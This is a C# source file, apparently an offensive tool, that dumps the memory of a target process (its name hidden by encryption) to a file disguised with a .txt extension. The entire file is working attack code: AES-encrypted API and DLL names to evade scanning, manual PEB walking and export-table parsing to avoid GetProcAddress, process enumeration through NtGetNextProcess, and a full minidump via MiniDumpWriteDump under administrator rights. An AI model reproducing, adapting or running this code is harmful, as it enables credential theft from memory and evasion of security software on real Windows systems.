using System;
using System.IO;
using System.Diagnostics;
using System.Security.Principal;
using System.Runtime.InteropServices;
using System.Text;
using System.Security.Cryptography;

namespace CustomD
{
    public class Program
    {      
        static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
        static String password = "MSLegitimateStr.";
        static String iv = "MSLegitimateStr.";

        // Strings
        static String decryptedDbgcore = DecryptStringFromBytes("BVai7tBW8s6qrhZU05Wxhw==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
        static String decryptedMDWD = DecryptStringFromBytes("tFP++qWUzC+ytbpdRB43HWOR6V5Vx/24oI3/Hly5zG0=", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
        static String decryptedKernel32 = DecryptStringFromBytes("TplZ7bp6eKRpNJFVqU2MGQ==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
        static String decryptedOP = DecryptStringFromBytes("kCrAtldSjJiMZ3Y1UPXZGw==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
        static String decryptedLL = DecryptStringFromBytes("EUYkQlZr1dktpF1kTL2yFA==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
        static String decryptedProcess = DecryptStringFromBytes("+zIykYwm/RSRRs/svAVoag==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
        static String decryptedNtdll = DecryptStringFromBytes("jJptiuemvxJB64wbGBqt/A==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
        static String decryptedPsapi = DecryptStringFromBytes("mMya9rZMB1jyVGpj2uoEGQ==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
        static String decryptedGPI = DecryptStringFromBytes("Wj2YEOtRIsHhjop0l7KQTQ==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
        static String decryptedNtGNP = DecryptStringFromBytes("HxXQg0uk9rxKj5N/pZ2iylNspyROlBdOmtejmzGhbzI=", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
        static String decryptedGPIF = DecryptStringFromBytes("JDC1XQIn6rcQ6vgRB8zGOSPEdjsglveXVjH9SWUw1mo=", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));


        [DllImport("kernel32.dll", SetLastError = true)] static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
        [DllImport("ntdll.dll", SetLastError = true)] static extern int NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, ref PROCESS_BASIC_INFORMATION pbi, uint processInformationLength, ref uint returnLength);       
        [StructLayout(LayoutKind.Sequential)] private struct PROCESS_BASIC_INFORMATION { public uint ExitStatus; public IntPtr PebBaseAddress; public UIntPtr AffinityMask; public int BasePriority; public UIntPtr UniqueProcessId; public UIntPtr InheritedFromUniqueProcessId; }
        [StructLayout(LayoutKind.Sequential)] public struct IMAGE_DOS_HEADER { public UInt16 e_magic; public UInt16 e_cblp; public UInt16 e_cp; public UInt16 e_crlc; public UInt16 e_cparhdr; public UInt16 e_minalloc; public UInt16 e_maxalloc; public UInt16 e_ss; public UInt16 e_sp; public UInt16 e_csum; public UInt16 e_ip; public UInt16 e_cs; public UInt16 e_lfarlc; public UInt16 e_ovno; [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)] public UInt16[] e_res1; public UInt16 e_oemid; public UInt16 e_oeminfo; [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)] public UInt16[] e_res2; public UInt32 e_lfanew; }
        [StructLayout(LayoutKind.Sequential)] public struct IMAGE_NT_HEADERS { public UInt32 Signature; public IMAGE_FILE_HEADER FileHeader; public IMAGE_OPTIONAL_HEADER32 OptionalHeader32; public IMAGE_OPTIONAL_HEADER64 OptionalHeader64; }
        [StructLayout(LayoutKind.Sequential)] public struct IMAGE_FILE_HEADER { public UInt16 Machine; public UInt16 NumberOfSections; public UInt32 TimeDateStamp; public UInt32 PointerToSymbolTable; public UInt32 NumberOfSymbols; public UInt16 SizeOfOptionalHeader; public UInt16 Characteristics; }
        [StructLayout(LayoutKind.Sequential)] public struct IMAGE_OPTIONAL_HEADER32 { public UInt16 Magic; public Byte MajorLinkerVersion; public Byte MinorLinkerVersion; public UInt32 SizeOfCode; public UInt32 SizeOfInitializedData; public UInt32 SizeOfUninitializedData; public UInt32 AddressOfEntryPoint; public UInt32 BaseOfCode; public UInt32 BaseOfData; public UInt32 ImageBase; public UInt32 SectionAlignment; public UInt32 FileAlignment; public UInt16 MajorOperatingSystemVersion; public UInt16 MinorOperatingSystemVersion; public UInt16 MajorImageVersion; public UInt16 MinorImageVersion; public UInt16 MajorSubsystemVersion; public UInt16 MinorSubsystemVersion; public UInt32 Win32VersionValue; public UInt32 SizeOfImage; public UInt32 SizeOfHeaders; public UInt32 CheckSum; public UInt16 Subsystem; public UInt16 DllCharacteristics; public UInt32 SizeOfStackReserve; public UInt32 SizeOfStackCommit; public UInt32 SizeOfHeapReserve; public UInt32 SizeOfHeapCommit; public UInt32 LoaderFlags; public UInt32 NumberOfRvaAndSizes; [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)] public IMAGE_DATA_DIRECTORY[] DataDirectory; }
        [StructLayout(LayoutKind.Sequential)] public struct IMAGE_OPTIONAL_HEADER64 { public UInt16 Magic; public Byte MajorLinkerVersion; public Byte MinorLinkerVersion; public UInt32 SizeOfCode; public UInt32 SizeOfInitializedData; public UInt32 SizeOfUninitializedData; public UInt32 AddressOfEntryPoint; public UInt32 BaseOfCode; public UInt64 ImageBase; public UInt32 SectionAlignment; public UInt32 FileAlignment; public UInt16 MajorOperatingSystemVersion; public UInt16 MinorOperatingSystemVersion; public UInt16 MajorImageVersion; public UInt16 MinorImageVersion; public UInt16 MajorSubsystemVersion; public UInt16 MinorSubsystemVersion; public UInt32 Win32VersionValue; public UInt32 SizeOfImage; public UInt32 SizeOfHeaders; public UInt32 CheckSum; public UInt16 Subsystem; public UInt16 DllCharacteristics; public UInt64 SizeOfStackReserve; public UInt64 SizeOfStackCommit; public UInt64 SizeOfHeapReserve; public UInt64 SizeOfHeapCommit; public UInt32 LoaderFlags; public UInt32 NumberOfRvaAndSizes; [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)] public IMAGE_DATA_DIRECTORY[] DataDirectory; }
        [StructLayout(LayoutKind.Sequential)] public struct IMAGE_DATA_DIRECTORY { public UInt32 VirtualAddress; public UInt32 Size; }
        [StructLayout(LayoutKind.Sequential)] public struct IMAGE_EXPORT_DIRECTORY { public UInt32 Characteristics; public UInt32 TimeDateStamp; public UInt16 MajorVersion; public UInt16 MinorVersion; public UInt32 Name; public UInt32 Base; public UInt32 NumberOfFunctions; public UInt32 NumberOfNames; public UInt32 AddressOfFunctions; public UInt32 AddressOfNames; public UInt32 AddressOfNameOrdinals; }

        delegate IntPtr OPDelegate(uint processAccess, bool bInheritHandle, int processId);
        delegate bool   MDWDDelegate(IntPtr hProcess, int ProcessId, IntPtr hFile, int Type, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);
        delegate IntPtr LLDelegate([MarshalAs(UnmanagedType.LPStr)] string lpFileName);
        delegate int GPIDelegate(IntPtr handle);
        delegate bool GNPDelegate(IntPtr handle, int MAX_ALLOWED, int param3, int param4, out IntPtr outHandle);
        delegate bool GPIFDelegate(IntPtr handle, StringBuilder fname, int nsize);


        public static T MarshalBytesTo<T>(byte[] bytes)
        {
            GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
            T theStructure = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
            handle.Free();
            return theStructure;
        }


        public unsafe static IntPtr auxGetModuleHandle(String dll_name)
        {
            IntPtr hProcess = (IntPtr)(-1); // Process.GetCurrentProcess().Handle;
            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
            uint temp = 0;
            NtQueryInformationProcess(hProcess, 0x0, ref pbi, (uint)(IntPtr.Size * 6), ref temp);
            IntPtr ldr_pointer = (IntPtr)((Int64)pbi.PebBaseAddress + 0x18);
            IntPtr ldr_adress = Marshal.ReadIntPtr(ldr_pointer);
            IntPtr InInitializationOrderModuleList = ldr_adress + 0x30;

            IntPtr next_flink = Marshal.ReadIntPtr(InInitializationOrderModuleList);
            IntPtr dll_base = (IntPtr)1;
            while (dll_base != IntPtr.Zero)
            {
                next_flink = next_flink - 0x10;
                dll_base = Marshal.ReadIntPtr(next_flink + 0x20);
                IntPtr buffer = Marshal.ReadIntPtr(next_flink + 0x50);
                String char_aux = null;
                String base_dll_name = "";
                while (char_aux != "")
                {
                    char_aux = Marshal.PtrToStringAnsi(buffer);
                    buffer += 2;
                    base_dll_name += char_aux;
                }
                next_flink = Marshal.ReadIntPtr(next_flink + 0x10);
                if (dll_name.ToLower() == base_dll_name.ToLower())
                {
                    return dll_base;
                }
            }
            return IntPtr.Zero;
        }


        public static IntPtr auxGetProcAddress(IntPtr pDosHdr, String func_name)
        {
            IntPtr hProcess = (IntPtr)(-1); // Process.GetCurrentProcess().Handle;
            byte[] data = new byte[Marshal.SizeOf(typeof(IMAGE_DOS_HEADER))];
            IntPtr aux_output = IntPtr.Zero;
            ReadProcessMemory(hProcess, pDosHdr, data, data.Length, out aux_output);

            IMAGE_DOS_HEADER _dosHeader = MarshalBytesTo<IMAGE_DOS_HEADER>(data);
            uint e_lfanew_offset = _dosHeader.e_lfanew;
            IntPtr nthdr = IntPtr.Add(pDosHdr, Convert.ToInt32(e_lfanew_offset));

            byte[] data2 = new byte[Marshal.SizeOf(typeof(IMAGE_NT_HEADERS))];
            ReadProcessMemory(hProcess, nthdr, data2, data2.Length, out aux_output);
            IMAGE_NT_HEADERS _ntHeader = MarshalBytesTo<IMAGE_NT_HEADERS>(data2);
            IMAGE_FILE_HEADER _fileHeader = _ntHeader.FileHeader;

            IntPtr optionalhdr = IntPtr.Add(nthdr, 24);
            byte[] data3 = new byte[Marshal.SizeOf(typeof(IMAGE_OPTIONAL_HEADER64))];
            ReadProcessMemory(hProcess, optionalhdr, data3, data3.Length, out aux_output);
            IMAGE_OPTIONAL_HEADER64 _optionalHeader = MarshalBytesTo<IMAGE_OPTIONAL_HEADER64>(data3);

            int numberDataDirectory = (_fileHeader.SizeOfOptionalHeader / 16) - 1;
            IMAGE_DATA_DIRECTORY[] optionalHeaderDataDirectory = _optionalHeader.DataDirectory;
            uint exportTableRVA = optionalHeaderDataDirectory[0].VirtualAddress;

            if (exportTableRVA != 0)
            {
                IntPtr exportTableAddress = IntPtr.Add(pDosHdr, (int)exportTableRVA);
                byte[] data4 = new byte[Marshal.SizeOf(typeof(IMAGE_EXPORT_DIRECTORY))];
                ReadProcessMemory(hProcess, exportTableAddress, data4, data4.Length, out aux_output);
                IMAGE_EXPORT_DIRECTORY exportTable = MarshalBytesTo<IMAGE_EXPORT_DIRECTORY>(data4);

                UInt32 numberOfNames = exportTable.NumberOfNames;
                UInt32 base_value = exportTable.Base;
                UInt32 addressOfFunctionsVRA = exportTable.AddressOfFunctions;
                UInt32 addressOfNamesVRA = exportTable.AddressOfNames;
                UInt32 addressOfNameOrdinalsVRA = exportTable.AddressOfNameOrdinals;
                IntPtr addressOfFunctionsRA = IntPtr.Add(pDosHdr, (int)addressOfFunctionsVRA);
                IntPtr addressOfNamesRA = IntPtr.Add(pDosHdr, (int)addressOfNamesVRA);
                IntPtr addressOfNameOrdinalsRA = IntPtr.Add(pDosHdr, (int)addressOfNameOrdinalsVRA);

                IntPtr auxaddressOfNamesRA = addressOfNamesRA;
                IntPtr auxaddressOfNameOrdinalsRA = addressOfNameOrdinalsRA;
                IntPtr auxaddressOfFunctionsRA = addressOfFunctionsRA;

                for (int i = 0; i < numberOfNames; i++)
                {
                    byte[] data5 = new byte[Marshal.SizeOf(typeof(UInt32))];
                    ReadProcessMemory(hProcess, auxaddressOfNamesRA, data5, data5.Length, out aux_output);
                    UInt32 functionAddressVRA = MarshalBytesTo<UInt32>(data5);
                    IntPtr functionAddressRA = IntPtr.Add(pDosHdr, (int)functionAddressVRA);
                    byte[] data6 = new byte[func_name.Length];
                    ReadProcessMemory(hProcess, functionAddressRA, data6, data6.Length, out aux_output);
                    String functionName = Encoding.ASCII.GetString(data6);
                    if (functionName == func_name)
                    {
                        // AdddressofNames --> AddressOfNamesOrdinals
                        byte[] data7 = new byte[Marshal.SizeOf(typeof(UInt16))];
                        ReadProcessMemory(hProcess, auxaddressOfNameOrdinalsRA, data7, data7.Length, out aux_output);
                        UInt16 ordinal = MarshalBytesTo<UInt16>(data7);
                        // AddressOfNamesOrdinals --> AddressOfFunctions
                        auxaddressOfFunctionsRA += 4 * ordinal;
                        byte[] data8 = new byte[Marshal.SizeOf(typeof(UInt32))];
                        ReadProcessMemory(hProcess, auxaddressOfFunctionsRA, data8, data8.Length, out aux_output);
                        UInt32 auxaddressOfFunctionsRAVal = MarshalBytesTo<UInt32>(data8);
                        IntPtr functionAddress = IntPtr.Add(pDosHdr, (int)auxaddressOfFunctionsRAVal);
                        return functionAddress;
                    }
                    auxaddressOfNamesRA += 4;
                    auxaddressOfNameOrdinalsRA += 2;
                }
            }
            return IntPtr.Zero;
        }


        public static IntPtr helpGetModuleHandle(String dll_name)
        {
            IntPtr dll_base = IntPtr.Zero;
            while (dll_base == IntPtr.Zero)
            {
                dll_base = auxGetModuleHandle(dll_name);
            }
            return dll_base;
        }


        // auxGetProcAddress may fail once if you call it hundreds of times
        public static IntPtr helpGetProcAddress(IntPtr dll_handle, String functioname)
        {
            IntPtr functionaddress = IntPtr.Zero;
            while (functionaddress == IntPtr.Zero)
            {
                functionaddress = auxGetProcAddress(dll_handle, functioname);
            }
            return functionaddress;
        }


        public static string DecryptStringFromBytes(String cipherTextEncoded, byte[] Key, byte[] IV)
        {
            byte[] cipherText = Convert.FromBase64String(cipherTextEncoded);
            if (cipherText == null || cipherText.Length <= 0)
                throw new ArgumentNullException("cipherText");
            if (Key == null || Key.Length <= 0)
                throw new ArgumentNullException("Key");
            if (IV == null || IV.Length <= 0)
                throw new ArgumentNullException("IV");
            string plaintext = null;
            using (RijndaelManaged rijAlg = new RijndaelManaged())
            {
                rijAlg.Key = Key;
                rijAlg.IV = IV;
                ICryptoTransform decryptor = rijAlg.CreateDecryptor(rijAlg.Key, rijAlg.IV);
                using (MemoryStream msDecrypt = new MemoryStream(cipherText))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                        {
                            plaintext = srDecrypt.ReadToEnd();
                        }
                    }
                }

            }
            return plaintext;
        }

        
        static String EncryptStringToBytes(string plainText, byte[] Key, byte[] IV)
        {
            if (plainText == null || plainText.Length <= 0)
                throw new ArgumentNullException("plainText");
            if (Key == null || Key.Length <= 0)
                throw new ArgumentNullException("Key");
            if (IV == null || IV.Length <= 0)
                throw new ArgumentNullException("IV");
            byte[] encrypted;
            using (RijndaelManaged rijAlg = new RijndaelManaged())
            {
                rijAlg.Key = Key;
                rijAlg.IV = IV;
                ICryptoTransform encryptor = rijAlg.CreateEncryptor(rijAlg.Key, rijAlg.IV);
                using (MemoryStream msEncrypt = new MemoryStream())
                {
                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                    {
                        using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                        {
                            swEncrypt.Write(plainText);
                        }
                        encrypted = msEncrypt.ToArray();
                    }
                }
            }
            return Convert.ToBase64String(encrypted);
        }


        public static int GetByName(string proc_name) {
            IntPtr k32 = helpGetModuleHandle(decryptedKernel32);
            IntPtr ntdll = helpGetModuleHandle(decryptedNtdll);
            IntPtr psapi = helpGetModuleHandle(decryptedPsapi);

            IntPtr addrGPI = helpGetProcAddress(k32, decryptedGPI);
            IntPtr addrNtGNP = helpGetProcAddress(ntdll, decryptedNtGNP);
            IntPtr addrGPIF = helpGetProcAddress(psapi, decryptedGPIF);
            
            GPIDelegate function_GPI = (GPIDelegate)Marshal.GetDelegateForFunctionPointer(addrGPI, typeof(GPIDelegate));
            GNPDelegate function_GNP = (GNPDelegate)Marshal.GetDelegateForFunctionPointer(addrNtGNP, typeof(GNPDelegate));
            GPIFDelegate function_GPIF = (GPIFDelegate)Marshal.GetDelegateForFunctionPointer(addrGPIF, typeof(GPIFDelegate));

            Console.WriteLine("2 " + Process.GetCurrentProcess());

            IntPtr aux_handle = IntPtr.Zero;
            int MAXIMUM_ALLOWED = 0x02000000;
            int pid = 0;
            while (!function_GNP(aux_handle, MAXIMUM_ALLOWED, 0, 0, out aux_handle))
            {
                StringBuilder fileName = new StringBuilder(100);
                function_GPIF(aux_handle, fileName, 100);
                char[] stringArray = fileName.ToString().ToCharArray();
                Array.Reverse(stringArray);
                string reversedStr = new string(stringArray);
                string res = reversedStr.Substring(0, reversedStr.IndexOf("\\"));
                stringArray = res.ToString().ToCharArray();
                Array.Reverse(stringArray);
                reversedStr = new string(stringArray);
                if (reversedStr == proc_name)
                {
                    pid = function_GPI(aux_handle);
                    return pid;
                }
            }
            return 0;
        }


        public static void Main(string[] args)
        {
            // Check we are running an elevated process
            if (WindowsIdentity.GetCurrent().Owner
                  .IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid) == false)
            {
                Console.WriteLine("[-] Error: Execute with administrative privileges.");
                return;
            }

            /*
            Console.WriteLine(EncryptStringToBytes("kernel32.dll", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv)));
            Console.WriteLine(EncryptStringToBytes("GetProcessId", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv)));
            Console.WriteLine(EncryptStringToBytes("ntdll.dll", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv)));
            Console.WriteLine(EncryptStringToBytes("NtGetNextProcess", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv)));
            Console.WriteLine(EncryptStringToBytes("GetProcessImageFileName", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv)));
            Console.WriteLine(EncryptStringToBytes("psapi.dll", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv)));
            */

            IntPtr k32      = helpGetModuleHandle(decryptedKernel32);
            IntPtr addrOP   = helpGetProcAddress(k32, decryptedOP);
            IntPtr addrLL   = helpGetProcAddress(k32, decryptedLL);
            OPDelegate function_OP = (OPDelegate)Marshal.GetDelegateForFunctionPointer(addrOP, typeof(OPDelegate));
            LLDelegate function_LL = (LLDelegate)Marshal.GetDelegateForFunctionPointer(addrLL, typeof(LLDelegate));

            IntPtr dbgc = function_LL(decryptedDbgcore);
            IntPtr addrMDWD = helpGetProcAddress(dbgc, decryptedMDWD);
            MDWDDelegate function_MDWD = (MDWDDelegate)Marshal.GetDelegateForFunctionPointer(addrMDWD, typeof(MDWDDelegate));

            //Get process PID
            int processPID = GetByName(decryptedProcess); // Process.GetProcessesByName(decryptedProcess)[0].Id;
            Console.WriteLine("[+] Process PID: " + processPID);

            // Generate the file name or get it from the input arguments
            String filename;
            if (args == null || args.Length == 0)
            {
                // Source: https://docs.microsoft.com/en-us/dotnet/api/system.datetime.tostring?view=net-5.0
                String now = DateTime.Now.ToString("dd-MM-yy-HHmm");
                String extension = ".txt";
                filename = Directory.GetCurrentDirectory() + "\\" + Environment.MachineName + "_" + now + extension;
            }
            else
            {
                filename = args[0];
            }

            // Create output file
            FileStream output_file = new FileStream(filename, FileMode.Create);

            // Create handle to the process
            // We need (PROCESS_VM_READ | PROCESS_QUERY_INFORMATION), we can get the values from https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights
            uint processRights = 0x0010 | 0x0400;
            IntPtr processHandle = function_OP(processRights, false, processPID);

            if (processHandle != INVALID_HANDLE_VALUE)
            {
                Console.WriteLine("[+] Handle to process created correctly.");
                // Read the process            
                bool isRead = function_MDWD(processHandle, processPID, output_file.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
                if (isRead)
                {
                    Console.WriteLine("[+] Successfully read process with pid " + processPID + " to file " + filename);
                }
                else
                {
                    Console.WriteLine("[-] Error: Process not read.");
                }
            }
            else
            {
                Console.WriteLine("[-] Error: Handle to process is NULL.");
            }
        }
    }

}